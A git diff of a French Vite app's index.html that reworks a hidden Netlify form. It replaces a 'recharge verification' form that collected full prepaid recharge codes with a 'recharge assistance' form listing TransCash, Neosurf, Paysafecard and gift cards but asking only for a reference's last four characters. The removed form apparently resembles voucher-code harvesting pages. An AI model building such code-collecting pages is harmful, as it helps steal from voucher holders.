@@ -2,28 +2,99 @@
 <html lang="fr">
   <head>
     <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Vérification de recharge</title>
+
+    <link
+      rel="icon"
+      type="image/svg+xml"
+      href="/vite.svg"
+    />
+
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0"
+    />
+
+    <meta
+      name="description"
+      content="Plateforme de demande d’assistance concernant une recharge."
+    />
+
+    <title>Assistance recharge</title>
   </head>
+
   <body>
+    <!--
+      Formulaire statique utilisé uniquement par Netlify
+      pour détecter les champs pendant le déploiement.
+    -->
     <form
-      name="recharge-verification"
+      name="recharge-support"
       method="POST"
-      action="/"
       data-netlify="true"
       netlify-honeypot="bot-field"
       hidden
     >
-      <input type="hidden" name="form-name" value="recharge-verification" />
-      <input name="bot-field" />
-      <select name="rechargeType"></select>
-      <input name="rechargePrice" type="number" />
-      <input name="rechargeCode" />
-      <input name="email" type="email" />
-      <select name="hideCode"></select>
+      <input
+        type="hidden"
+        name="form-name"
+        value="recharge-support"
+      />
+
+      <p hidden>
+        <label>
+          Ne remplissez pas ce champ :
+          <input
+            name="bot-field"
+            autocomplete="off"
+            tabindex="-1"
+          />
+        </label>
+      </p>
+
+      <input
+        type="text"
+        name="fullName"
+      />
+
+      <input
+        type="email"
+        name="email"
+      />
+
+      <select name="paymentMethod">
+        <option value="TransCash">TransCash</option>
+        <option value="Neosurf">Neosurf</option>
+        <option value="Apple Gift Card">Apple Gift Card</option>
+        <option value="Steam Card">Steam Card</option>
+        <option value="Google Play Card">Google Play Card</option>
+        <option value="Paysafecard">Paysafecard</option>
+        <option value="Autre">Autre</option>
+      </select>
+
+      <input
+        type="number"
+        name="amount"
+      />
+
+      <input
+        type="text"
+        name="referenceLast4"
+      />
+
+      <textarea name="message"></textarea>
+
+      <input
+        type="checkbox"
+        name="consent"
+        value="oui"
+      />
     </form>
+
     <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
+
+    <script
+      type="module"
+      src="/src/main.tsx"
+    ></script>
   </body>
 </html>
